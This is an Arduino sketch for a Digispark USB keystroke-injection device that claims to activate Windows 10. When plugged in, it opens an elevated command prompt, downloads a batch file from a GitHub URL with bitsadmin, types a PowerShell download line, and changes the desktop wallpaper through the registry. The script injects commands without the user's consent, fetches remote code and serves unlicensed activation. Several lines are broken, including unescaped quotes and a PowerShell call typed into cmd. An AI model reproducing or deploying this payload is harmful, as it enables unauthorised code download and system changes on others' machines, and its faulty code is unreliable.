//This DigiKeyboard Script activates Windows 10 ( any version !! ) by using the script at
( https://raw.githubusercontent.com/applebanana996/Windows-10-Activator/master/Windows%2010%20Activator.bat ) 

#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, MOD_SHIFT_LEFT, KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("bitsadmin /transfer mydownloadjob /download /priority normal "https://raw.githubusercontent.com/applebanana996/Windows-10-Activator/master/Windows%2010%20Activator.bat" "C:\Downloads\WinChan.bat"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/applebanana996/Windows-10-Activator/master/Windows%2010%20Activator.bat\" , \"WindowsChan.bat\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\doge.jpg\" /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
